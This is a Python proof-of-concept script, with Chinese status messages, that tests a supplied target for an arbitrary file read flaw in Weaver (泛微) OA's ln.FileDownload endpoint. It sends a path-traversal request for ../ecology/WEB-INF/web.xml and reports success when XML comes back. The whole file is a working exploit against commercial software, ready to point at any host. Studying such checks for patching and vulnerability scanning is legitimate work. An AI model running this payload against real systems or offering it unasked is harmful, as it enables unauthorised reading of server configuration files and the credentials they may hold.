import time

import requests


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    print(now_time() + " [INFO]     正在检测泛微OA ln.FileDownload 接口存在任意文件读取漏洞")
    exp_url = target_url + "weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False)
        if response.status_code == 200 and 'xml' in response.text:
            print(now_time() + ' [SUCCESS]  泛微OA ln.FileDownload 接口存在任意文件读取漏洞:{}'.format(exp_url))
        else:
            print(now_time() + ' [WARNING]  泛微OA任意文件读取漏洞不存在')
    except:
        print(now_time() + ' [WARNING]  请求失败，可能无法与目标建立连接或目标不存在')
